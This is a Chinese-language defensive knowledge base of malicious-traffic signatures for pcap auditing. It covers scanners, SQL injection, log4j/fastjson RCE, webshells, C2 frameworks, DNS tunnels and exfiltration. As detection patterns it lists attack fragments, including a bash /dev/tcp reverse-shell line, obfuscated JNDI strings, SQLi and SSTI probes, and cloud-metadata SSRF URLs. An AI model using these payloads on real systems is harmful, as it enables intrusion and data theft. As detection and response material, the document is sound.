# Malicious Traffic Signatures — 基础 12 类

> 面向 pcap/pcapng 离线审计的恶意流量识别知识库。
> **何时使用**：拿到客户提交的 pcap / 主动镜像抓包，需要快速定位常见恶意流量类型时。
> 所有识别特征仅供检测使用，禁止用于攻击复现。
> 与运行时规则 `R-TRAF-NNN`（scripts/traffic_anomaly.py）对齐，与知识库 ID `SIG-TRAF-NNN`（data/traffic-signatures.json）双向可查。

---

## 通用识别路径

pcap 审计的 6 大视图（按蓝队实战优先级排列）：

1. **http 视图**（`scripts/pcap_parser.py --views http`）：URI / UA / Referer / Host / Content-Type / body 长度 —— 一线首查，覆盖 80% 常见 Web 攻击与工具指纹。
2. **dns 视图**：qname / qtype / rdata / 子域名熵 —— 探测隧道类攻击与 DGA。
3. **tls 视图**：SNI / JA3 / JA3S / cert CN/O / ALPN —— 定位加密 C2 与免杀通信。
4. **flow 视图**：五元组统计 / 包大小分布 / 时间间隔 —— 定位心跳与数据外发。
5. **creds 视图**：明文凭据泄露（HTTP Basic / FTP / Telnet / SMTP AUTH） —— 快速捞取"送分题"。
6. **conn 视图**（可选）：TCP 状态、重传、异常握手 —— 用于扫描器与端口探测识别。

蓝队一般流程：`http → creds → dns → tls → flow → conn`，先看命中范围最广、置信度最高的层，逐步下钻。

---

## 分类速查表

| 类型 | rule_id 范围 | severity 上限 | 主要视图 | 关键特征概述 |
|---|---|---|---|---|
| 1. 扫描器流量 | R-TRAF-001~010 | P2 | http | 高并发 + 敏感路径 + 工具 UA |
| 2. SQL 注入 | R-TRAF-011~020 | P1 | http | SQL 关键字 + payload URL 编码 |
| 3. RCE / 反序列化 | R-TRAF-021~030 | P0 | http | `${jndi:` / `@type` / OGNL 表达式 |
| 4. XSS / SSRF | R-TRAF-031~040 | P2 | http | `<script>` / `file://` / metadata IP |
| 5. Webshell 通信 | R-TRAF-041~050 | P0 | http | 固定 body 长度 + 高熵 + 工具指纹 |
| 6. C2 通信 | R-TRAF-051~070 | P0 | http/tls | malleable path + JA3 + 心跳 |
| 7. DNS 隧道 | R-TRAF-071~080 | P0 | dns | 长子域 + 高频 TXT + 高熵 |
| 8. DGA 域名 | R-TRAF-081~085 | P1 | dns | 长度异常 + 字符分布异常 |
| 9. 反弹 Shell | R-TRAF-086~090 | P0 | flow | 常用端口 + 长连接 + 交互模式 |
| 10. 明文凭据 | R-TRAF-091~095 | P1 | creds | Basic Auth / USER PASS 明文 |
| 11. 数据外发 | R-TRAF-096~100 | P1 | http/flow | 大 body 上传 + rclone/megatools UA |
| 12. C2 心跳 | R-TRAF-181~185 | P1 | flow | 长连接 + 小包 + 规律间隔 |

---

## 1. 扫描器流量（Scanner）

### 识别特征

- **HTTP UA 关键字**（≥ 15 个）：`sqlmap` / `nuclei` / `xray` / `awvs` / `acunetix` / `nessus` / `nmap` / `masscan` / `fscan` / `goby` / `dirsearch` / `dirbuster` / `wfuzz` / `gobuster` / `feroxbuster` / `httpx` / `naabu` / `subfinder` / `ffuf`
- **敏感路径高频访问**：`/.git/` `/.env` `/.svn/` `/wp-admin/` `/admin/` `/actuator/` `/manager/html` `/druid/` `/console/` `/swagger-ui.html` `/api/v1/` `/graphql` `/phpmyadmin/`
- **行为特征**：
  - 单 src_ip 5 分钟内 URI 数 > 200
  - 4xx 响应占比 > 50%
  - User-Agent 缺失或反复变化
  - 无 Referer 或 Referer 全等于 root
- **conn 视图**：TCP 半连接扫描（SYN 后无 ACK）批量出现同 src_ip

### 关联 rule_id

- 运行时：`R-TRAF-001`（scanner UA 命中） / `R-TRAF-002`（sensitive path） / `R-TRAF-003`（高频 URI 突增） / `R-TRAF-004`（4xx 占比异常）
- 知识库：`SIG-TRAF-001` ~ `SIG-TRAF-010`

### 误报排查

- 客户内部漏扫工具（绿盟 RSAS / 启明天镜 / nessus 授权扫描）应加入白名单，通常 src_ip 固定
- 健康检查路径（`/healthz` / `/actuator/health` / `/_status`）本身高频，需与业务清单比对
- CI/CD 探活（jenkins / gitlab runner）UA 中含 `curl` 但目的地固定

### 处置建议

1. 确认 src_ip 是否在客户漏扫白名单内 → 是则标 `false_positive_prob >= 0.8`
2. 白名单外 IP：确认扫描时段是否与红蓝演练报备时间重合
3. 未报备 → 边界防火墙 ban 该 IP，并留证据（源 IP + 时间窗 + 命中路径）
4. 参考 `references/playbooks/traffic-audit.md` §4 场景 A

---

## 2. SQL 注入流量（SQLi）

### 识别特征

- **URI / body 中的关键字组合**（URL 或 base64 编码后仍可解出）：
  - 布尔盲注：`AND 1=1` / `AND 1=2` / `OR 1=1--` / `%20AND%201%3D1`
  - 时间盲注：`SLEEP(5)` / `BENCHMARK(` / `WAITFOR DELAY` / `pg_sleep(`
  - 联合注入：`UNION SELECT` / `UNION ALL SELECT` + 字段占位
  - 报错注入：`updatexml(` / `extractvalue(` / `floor(rand()*2)` / `exp(~(select`
  - 堆叠注入：URL 中出现分号 `;` 后接 `SELECT` / `DROP`
- **绕过特征**：`/*!50000SELECT*/` 内联注释 / `SEL%00ECT` 空字节截断 / `sElEcT` 大小写混淆 / URL 双编码
- **sqlmap 独有指纹**：UA 含 `sqlmap/1.x` / URI 含 `Testing '` / boolean-based payload 中 `AND (SELECT (CASE WHEN`
- **响应特征**：同一 URI 不同 payload 响应长度显著波动（布尔盲注）

### 关联 rule_id

- 运行时：`R-TRAF-011` ~ `R-TRAF-015`（关键字命中） / `R-TRAF-016`（sqlmap UA）
- 知识库：`SIG-TRAF-011` ~ `SIG-TRAF-020`

### 误报排查

- 业务本身以 SQL 关键字命名的接口（如 `/api/select/user`）
- ORM 生成的合法 SQL 字符串日志混入（应在 nginx access 层过滤 body，而非误当 URI）
- 蜜罐 / 靶场流量：客户内部演练环境有意暴露的注入点

### 处置建议

1. 定位受害应用 & 参数：从命中的 URI 反推目标接口
2. 立即联动 WAF：ban 攻击 src_ip / 加对应参数的正则拦截
3. 保留完整流表：pcap 切片 + nginx access 相关行，作为攻击链证据
4. 参考 `references/playbooks/sql-injection.md` §止血

---

## 3. RCE / 反序列化流量（RCE）

### 识别特征

- **JNDI 注入（log4j 类）**：URI / header / body / UA 中出现 `${jndi:ldap://` / `${jndi:rmi://` / `${jndi:dns://` / `${jndi:iiop://` / `${${lower:j}ndi:` 混淆变体 / `${${::-j}${::-n}${::-d}${::-i}:` 深度混淆
- **fastjson 反序列化**：POST body 含 `"@type":"com.sun.rowset.JdbcRowSetImpl"` / `"@type":"org.apache.commons.collections."` / `"dataSourceName"` + `"autoCommit"`
- **shiro 反序列化**：Cookie 中 `rememberMe=` 值长度异常（> 200 字符 base64） + 每次请求 `rememberMe` 值变化
- **weblogic T3 / XMLDecoder**：TCP 7001/7002 上出现 `t3://` 协议头 / `<java version=` XML payload
- **OGNL / SpEL 注入**：URI 含 `%24%7B` （`${` 编码） / `%23_memberAccess` / `#Runtime@getRuntime` / `T(java.lang.Runtime).getRuntime().exec`
- **模板注入（SSTI）**：`{{7*7}}` / `${7*7}` / `<%= 7*7 %>` / `#{7*7}` 试探性 payload
- **Struts2 OGNL**：URI 含 `%25%7B` 或 `redirect:%24` / `action:%23context`

### 关联 rule_id

- 运行时：`R-TRAF-021`（JNDI）/ `R-TRAF-022`（fastjson `@type`）/ `R-TRAF-023`（shiro cookie 异常）/ `R-TRAF-024`（OGNL）/ `R-TRAF-025`（SSTI 试探）
- 知识库：`SIG-TRAF-021` ~ `SIG-TRAF-030`

### 误报排查

- 业务日志中合法出现的模板字符串（`${user.name}` 类 EL 表达式在错误页里回显）
- 攻防演练靶场的教学 payload
- WAF 自身回显攻击 payload（响应 body 里包含拦截提示，会被二次误命中）

### 处置建议

1. **P0 处理**：确认是否有 4xx 之外的响应（200 / 500 / 503 都可能表示已执行）
2. 主机侧联动：检查目标 IP 的 web 容器进程是否 fork 出异常子进程（`bash` / `curl` / `wget` / `powershell`）
3. 立即 ban src_ip + 临时下线漏洞 URL
4. 参考 `references/playbooks/command-exec.md`

---

## 4. XSS 与 SSRF 流量

> 护网期间蓝队优先级偏低，简化描述。

### 4.1 XSS 识别特征

- URL 参数 / body 中出现 `<script>` / `onerror=` / `onload=` / `javascript:` / `<img src=x onerror=` / `<svg/onload=`
- 编码变体：`%3Cscript%3E` / `&#x3C;script&#x3E;` / unicode `<script`
- XSS 平台回连：body 或 Referer 中出现已知 XSS 平台域名（xss.pt / xsshunter.com / xss.la）

### 4.2 SSRF 识别特征

- URL 参数值含 `http://127.0.0.1` / `http://localhost` / `http://[::1]` / `http://0.0.0.0`
- 云 metadata 探测：`http://169.254.169.254/latest/meta-data/` / `http://100.100.100.200/latest/meta-data/`（阿里云） / `http://metadata.google.internal/`
- 协议探测：`file://` / `dict://` / `gopher://` / `ftp://`
- DNS rebinding 域名：`*.nip.io` / `*.xip.io` / `*.sslip.io`

### 关联 rule_id

- 运行时：`R-TRAF-031`（XSS payload） / `R-TRAF-032`（SSRF metadata） / `R-TRAF-033`（内网 IP 参数）
- 知识库：`SIG-TRAF-031` ~ `SIG-TRAF-040`

### 误报排查

- 富文本编辑器合法保存的 HTML 内容（有 Referer + 已登录会话）
- 业务本身以 IP 为参数的接口（如内部服务发现 URL）

### 处置建议

- XSS：通常单条不构成 P0，累积告警 + 有实际 cookie 回传时升级 P1
- SSRF：涉及云 metadata / 内网服务发现的直接 P1，其余 P2

---

## 5. Webshell 通信流量

### 识别特征

- **哥斯拉（Godzilla）**：
  - 默认 Cookie 结尾 `;` 前有固定 padding
  - POST body base64 密文，前 16 字节固定
  - 默认 key `key=key` 时的 md5 前 16 位可静态推测
  - Content-Type 常为 `application/octet-stream` 但请求路径是 `.php`/`.jsp`
- **冰蝎（Behinder）v2/v3/v4**：
  - v2 默认 AES key = `md5("rebeyond")[0:16]`
  - v3+ 由 `/pass?pass=<md5>` 首次协商 key
  - POST body 长度为 16 字节整数倍
  - Pragma / Cache-Control 组合异常
- **蚁剑（AntSword）**：
  - 默认 UA `antSword/vX.X`
  - POST body 含 `_0x` 前缀混淆变量名
  - 命令执行回显带固定分隔符 `->|` `|<-`
- **China Chopper (菜刀)**：
  - POST body 以 `&z0=` / `&z1=` / `&z2=` 起始
  - Content-Length 短小（< 500 字节）
- **通用 webshell 特征**：
  - POST 远多于 GET（同 URI 比 > 5:1）
  - 请求 body Content-Length 波动小（管理工具通常固定协议长度）
  - 响应 Content-Length 波动大（命令结果长度不定）

### 关联 rule_id

- 运行时：`R-TRAF-041`（godzilla） / `R-TRAF-042`（behinder） / `R-TRAF-043`（antsword UA） / `R-TRAF-044`（china chopper body） / `R-TRAF-045`（通用高熵 body）
- 知识库：`SIG-TRAF-041` ~ `SIG-TRAF-050`
- 交叉：`references/attack-patterns/webshell-signatures.md`

### 误报排查

- 业务 API 的加密请求（如金融接口的 SM4 加密）— 需要 API 白名单
- 业务上传接口（正常图片上传 POST base64 body）— 看 URI 与 Referer 链

### 处置建议

1. 立即定位主机侧文件：拿到目标 URI 后到主机上 `find <webroot> -name '<basename>'`
2. 参考 `references/playbooks/webshell.md` §6 止血流程
3. 保留 pcap 切片作为攻击者操作序列证据

---

## 6. C2 通信流量（CobaltStrike / Sliver / Empire / MSF）

### 识别特征

- **Cobalt Strike**：
  - Malleable profile 默认 URI：`/aaa9` / `/ab2u` / `/ptj` / `/submit.php`
  - checksum8 算法可验证：URI 段字符 ASCII 和 mod 256 == 92 (x86) 或 93 (x64)
  - 伪装 Cookie：`__cfduid` / `PHPSESSID` / `__utma` 长度 > 200 字节的 base64
  - 默认 TLS JA3：`72a589da586844d7f0818ce684948eea`（Java keytool 默认证书）
  - 心跳规律：固定间隔 jitter ±25% 的等长 GET
- **Sliver**：
  - 默认端口 31337 / 8443 + mTLS
  - 伪装静态资源：`.woff` / `.svg` / `.css` 后缀但响应为密文
  - DNS C2 使用 base32（更长子域）
- **Metasploit / Meterpreter**：
  - reverse_tcp 常用端口 4444 / 4445 / 5555
  - reverse_https URI：4 字节随机段 + checksum8
  - 默认 jitter = 0 表现极机械
- **Empire / PoshC2**：
  - Empire 默认 UA：`Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko`
  - Empire 默认路径：`/admin/get.php` / `/login/process.php` / `/news.php`
  - PoshC2 默认路径：`/images/` / `/news.asp` / `/blogs/`

### 关联 rule_id

- 运行时：`R-TRAF-051`（CS malleable path） / `R-TRAF-052`（CS checksum8） / `R-TRAF-053`（CS 默认 JA3） / `R-TRAF-054`（Sliver mTLS） / `R-TRAF-055`（MSF reverse port） / `R-TRAF-056`（Empire UA）
- 知识库：`SIG-TRAF-051` ~ `SIG-TRAF-070`
- 交叉：`references/attack-patterns/c2-signatures.md`（完整 44 条 SIG-C2）

### 误报排查

- 业务 SDK 的心跳（微信推送 / APM agent）：看目的 IP 是否在业务白名单，域名是否是知名 SDK
- CDN 切换重连：JA3 多样化，但目的都是同一批 CDN IP
- 内网负载均衡健康检查：源目 IP 都在内网 /24 内

### 处置建议

1. **P0 处理**：立即隔离源主机
2. 采集主机侧证据：`ps -ef` / `netstat -antp` / `lsof` 找到发起进程
3. dump 内存 + 保存 pcap 切片
4. 参考 `references/playbooks/command-exec.md` §根除

---

## 7. DNS 隧道（DNSCAT2 / iodine / dns2tcp）

### 识别特征

- **qname 长度异常**：单次查询子域名长度 > 50 字符（正常业务通常 < 30）
- **qtype 分布异常**：TXT / NULL / CNAME / MX 类型占比 > 30%（正常业务 A/AAAA 主导）
- **子域名熵值 > 4.0**：说明含 base32 / base64 编码内容
- **查询频率**：单 src_ip 对同一 二级域名 5 分钟内查询 > 500 次
- **iodine 特征**：qname 中 `-` 分隔的多段（编码分片） + 特定的握手初始 qname 如 `va<xxxxx>.<domain>`
- **dnscat2 特征**：qname 前缀含固定 5 字符标签（sessionID） + txt 响应长度 > 200
- **dns2tcp 特征**：qname 长度非常长（接近 253 字符上限） + 独有握手序列

### 关联 rule_id

- 运行时：`R-TRAF-071`（qname 长度） / `R-TRAF-072`（TXT 高频） / `R-TRAF-073`（子域熵值） / `R-TRAF-074`（NULL/CNAME 异常）
- 知识库：`SIG-TRAF-071` ~ `SIG-TRAF-080`

### 误报排查

- 反垃圾邮件（SPF / DKIM / DMARC）大量 TXT 查询
- CDN 服务 CNAME 链较长（`a.example.com` → `a.cdn.com` → `edge.cdn.com`）
- 邮件网关的 SPF / DKIM 校验行为
- 云安全服务的 DNS 探测（如 SecOps DNS-based tracing）

### 处置建议

1. 定位内网发起主机：从 pcap dns 视图看 src_ip
2. 立即出口 DNS 加过滤规则（阻断该二级域）
3. 主机侧排查异常进程 + 排查是否 C2 隧道复用 DNS
4. 参考 `references/playbooks/traffic-audit.md` §4 场景 B

---

## 8. DGA 域名

### 识别特征

- **域名长度**：单个 label 长度 > 30 字符
- **字符分布异常**：数字字符比例 > 30% / 元音字母比例 < 20% / 字母数字随机组合
- **同源查询突增**：单进程 / 单主机每小时 DGA 疑似域名查询 > 20 次
- **响应结果**：多数 NXDOMAIN（DGA 特征之一，攻击者只需少数域名解析成功）
- **常见家族特征**：
  - Conficker：8-11 位小写字母 + `.info` / `.biz` / `.org`
  - Necurs：7-21 位混合字符 + 45 个 TLD 轮换
  - Emotet：短域名 + 特定 TLD
  - Kraken：长度 6-11 + `.ddns.net` / `.dyndns.tv` 类 DDNS

### 关联 rule_id

- 运行时：`R-TRAF-081`（长域名） / `R-TRAF-082`（NXDOMAIN 占比高） / `R-TRAF-083`（同源查询突增）
- 知识库：`SIG-TRAF-081` ~ `SIG-TRAF-085`

### 误报排查

- CDN 边缘节点域名（`a1b2c3d4.cloudfront.net`）—— 需要 CDN 白名单
- 云对象存储签名 URL（`s3-abcxyz.amazonaws.com`）
- 广告 / 分析平台的短周期域名（google analytics / doubleclick）

### 处置建议

1. 分析 NXDOMAIN 占比：> 80% 且长度异常 → P1
2. 联合内部主机侧查发起进程
3. 出口 DNS 加过滤规则

---

## 9. 反弹 Shell（Reverse Shell）

### 识别特征

- **常用端口**：4444 / 1337 / 8888 / 13337 / 6666 / 9999（MSF/nc/socat 默认）
- **行为特征**：
  - 内网主机主动连接外网非常规高端口（> 10000）
  - 单个 TCP 长连接持续 > 1h
  - 交互式包大小规律：小包（命令 < 100B） + 中等包（回显 500B ~ 5KB）交替
  - 出站方向数据量总体大于入站（受害者向攻击者传数据）
- **协议特征**：
  - Bash reverse：`bash -i >& /dev/tcp/<ip>/<port>` 明文（历史很少见但常在早期入侵抓到）
  - nc reverse：无协议 header，纯 TCP 数据流
  - socat / ncat SSL：TLS 握手但 SNI 空 / 自签名证书
  - Powershell reverse：Windows 到外网 4444 端口的 TLS 长连接
- **加密变体**：TLS 加密但证书 CN = `localhost` / 空 CN / 自签名

### 关联 rule_id

- 运行时：`R-TRAF-086`（可疑端口出站） / `R-TRAF-087`（长交互连接） / `R-TRAF-088`（自签证书 + 内网发起）
- 知识库：`SIG-TRAF-086` ~ `SIG-TRAF-090`

### 误报排查

- 内网测试环境的 debugger / IDE 远程调试（如 pycharm remote debug）
- CI/CD agent 与 master 之间的长连接
- 应用心跳 / 长轮询业务（同事内部工具）

### 处置建议

1. **P0 处理**：立即隔离源主机
2. 主机侧：`netstat -antp | grep <外网 IP>` 拿到发起进程
3. 参考 `references/playbooks/command-exec.md`

---

## 10. 明文凭据泄露（Cleartext Credentials）

### 识别特征

- **HTTP Basic Auth**：请求头 `Authorization: Basic <base64>` （base64 解码后为 `user:pass`）
- **FTP**：`USER <name>` + `PASS <pw>` 命令序列
- **Telnet**：交互式登录字段（`login:` `Password:` 提示 + 后续明文响应）
- **MySQL pre-4.1**：老版协议明文密码握手（现代罕见但仍有工控 / 老系统）
- **SMTP AUTH LOGIN**：`AUTH LOGIN` 后连续两次 base64 编码字段（用户名 + 密码）
- **POP3 / IMAP 明文**：`USER` / `PASS` / `LOGIN` 命令
- **数据库 JDBC / ODBC 明文连接串**：HTTP 抓包中出现 `jdbc:mysql://user:pw@host:port/db`

### 关联 rule_id

- 运行时：`R-TRAF-091`（HTTP Basic） / `R-TRAF-092`（FTP USER/PASS） / `R-TRAF-093`（SMTP AUTH LOGIN） / `R-TRAF-094`（Telnet 明文） / `R-TRAF-095`（JDBC 明文串）
- 知识库：`SIG-TRAF-091` ~ `SIG-TRAF-095`

### 误报排查

- 内部老系统正常业务（工控 / 一体化设备 SNMP v1/v2 / 老版 zabbix agent）—— 需要标记为"内部系统合规豁免"
- 演练靶场 / 培训环境有意开放的漏洞点

### 处置建议

1. **P1 处理**：提取到的凭据立即通知客户改密（脱敏后仅传"账户名首字符 + 长度"给客户 confirm）
2. 建议客户逐步淘汰明文协议 / 加 TLS 封装
3. 出具风险清单，纳入年度整改

---

## 11. 数据外发（Exfiltration）

### 识别特征

- **超大 POST body**：单请求 body > 10MB，且路径非业务上传接口
- **压缩包扩展名**：URI 含 `.zip` `.rar` `.7z` `.tar.gz` `.tar.zst` 并以上传方式提交
- **数据外发工具 UA**：
  - `rclone/v1.x`
  - `megatools`
  - `MegaSync`
  - `curl/` + POST 大 body
  - `python-requests/` + PUT 到外部对象存储
- **公有云存储上传**：目的域名含 `mega.nz` / `transfer.sh` / `filebin.net` / `anonfiles.com` / `s3.amazonaws.com`（非业务 S3） / `blob.core.windows.net`（非业务 Azure）
- **DNS 隧道外发**：见 §7 —— 但更关注 "上传方向的分片数据量"
- **异常 SFTP / FTP 出站**：内网 SFTP 客户端主动连接外网 22 端口

### 关联 rule_id

- 运行时：`R-TRAF-096`（大 body 上传） / `R-TRAF-097`（rclone UA） / `R-TRAF-098`（公网存储上传） / `R-TRAF-099`（内网 SFTP 出站）
- 知识库：`SIG-TRAF-096` ~ `SIG-TRAF-100`

### 误报排查

- 合规备份到公有云（客户已在合规清单里授权）—— 白名单目的域名
- 员工正常网盘上传（企业微信 / 钉钉网盘）—— 域名白名单
- 灰度日志上报（业务发到日志服务）—— 目的域名白名单

### 处置建议

1. 定位内部源主机 + 发起进程
2. 立即出口 ban 目的域名 / IP
3. 与客户合规 team 对齐是否为授权行为
4. 参考 `references/playbooks/traffic-audit.md` §4 场景 D

---

## 12. C2 心跳（Beacon）

### 识别特征

- **长连接 + 大量小包**：TCP 会话时长 > 1h，包数 > 200，平均包大小 < 200 字节
- **规律间隔**：包间时间戳标准差小（jitter 低于 20%），呈现 5s / 30s / 60s / 300s 等固定周期
- **bytes/packet ratio**：< 200（表明大部分是 keep-alive 心跳而非数据传输）
- **不平衡流量**：入站与出站字节数比接近 1:1（正常业务通常不平衡）
- **加密封装**：TLS 或自定义 TCP，无 HTTP 报文结构
- **典型工具画像**：
  - CS Beacon：sleep 60s + jitter 20%
  - MSF meterpreter default：sleep 15s
  - Sliver：默认 60s
  - PoshC2：5s（异常短）
  - Empire：60s

### 关联 rule_id

- 运行时：`R-TRAF-181`（长连接小包） / `R-TRAF-182`（规律间隔） / `R-TRAF-183`（低 bytes/pkt ratio） / `R-TRAF-184`（TLS + 空 SNI + 长连接） / `R-TRAF-185`（1:1 入出比）
- 知识库：`SIG-TRAF-101` ~ `SIG-TRAF-105`
- 交叉：`references/attack-patterns/c2-signatures.md` §九 共同 C2 行为

### 误报排查

- 业务 keep-alive（数据库连接池 / IM 长连接） —— 目的通常在业务内网
- 远程办公 SDK（TeamViewer / AnyDesk / Sunlogin） —— 有明确的商业域名
- 云 SDK 心跳（阿里云 SLS / AWS CloudWatch agent）
- 监控 agent（Prometheus node_exporter / Zabbix agent）

### 处置建议

1. 关联多维证据：心跳 + 出网 VPS 段 + 主机侧异常进程 = P0
2. 单一心跳信号（无其他证据）通常降级 P2 或标误报待观察
3. 参考 `references/playbooks/command-exec.md`

---

## 附录 A：rule_id 分布速查

| 规则 ID | 分类 | 说明 | severity | 主视图 |
|---|---|---|---|---|
| R-TRAF-001 | 扫描器 | scanner UA 命中 | P2 | http |
| R-TRAF-002 | 扫描器 | sensitive path 高频 | P2 | http |
| R-TRAF-003 | 扫描器 | URI 数突增 | P2 | http |
| R-TRAF-004 | 扫描器 | 4xx 占比异常 | P3 | http |
| R-TRAF-011 | SQLi | 布尔 / 联合 / 时间关键字 | P1 | http |
| R-TRAF-016 | SQLi | sqlmap UA | P1 | http |
| R-TRAF-021 | RCE | JNDI payload | P0 | http |
| R-TRAF-022 | RCE | fastjson @type | P0 | http |
| R-TRAF-023 | RCE | shiro cookie 异常 | P1 | http |
| R-TRAF-024 | RCE | OGNL / SpEL | P1 | http |
| R-TRAF-031 | XSS | payload 关键字 | P2 | http |
| R-TRAF-032 | SSRF | 云 metadata 地址 | P1 | http |
| R-TRAF-041 | Webshell | godzilla 指纹 | P0 | http |
| R-TRAF-042 | Webshell | behinder 指纹 | P0 | http |
| R-TRAF-043 | Webshell | antsword UA | P0 | http |
| R-TRAF-051 | C2 | CS malleable path | P0 | http |
| R-TRAF-053 | C2 | CS 默认 JA3 | P0 | tls |
| R-TRAF-054 | C2 | Sliver mTLS | P0 | tls |
| R-TRAF-071 | DNS 隧道 | qname 长度异常 | P0 | dns |
| R-TRAF-072 | DNS 隧道 | TXT 高频 | P1 | dns |
| R-TRAF-081 | DGA | 长域名 | P1 | dns |
| R-TRAF-086 | 反弹 shell | 可疑端口出站 | P0 | flow |
| R-TRAF-091 | 明文凭据 | HTTP Basic | P1 | creds |
| R-TRAF-092 | 明文凭据 | FTP USER/PASS | P1 | creds |
| R-TRAF-096 | 数据外发 | 大 body 上传 | P1 | http |
| R-TRAF-181 | 心跳 | 长连接小包 | P1 | flow |
| R-TRAF-182 | 心跳 | 规律间隔 | P1 | flow |

（完整列表见 `scripts/traffic_anomaly.py`）

---

## 附录 B：知识库 SIG-TRAF-* 定义位置

所有 SIG-TRAF-NNN 条目在 `data/traffic-signatures.json` 内。可用如下方式查询：

```bash
# 查询某条 SIG 定义
grep -A 5 '"id": "SIG-TRAF-041"' data/traffic-signatures.json

# 查询某类攻击的所有条目
grep -B 1 -A 5 '"category": "webshell"' data/traffic-signatures.json

# 列出所有 rule_id
grep -oE '"SIG-TRAF-[0-9]+"' data/traffic-signatures.json | sort -u
```

---

## 附录 C：与其他文档的交叉索引

- 主机侧 webshell 特征：`references/attack-patterns/webshell-signatures.md`
- 主机侧 C2 特征：`references/attack-patterns/c2-signatures.md`
- Windows 横向流量：`references/attack-patterns/windows-lateral-traffic.md`
- 内网穿透工具流量：`references/attack-patterns/tunnel-tools-traffic.md`
- pcap 审计端到端流程：`references/playbooks/traffic-audit.md`
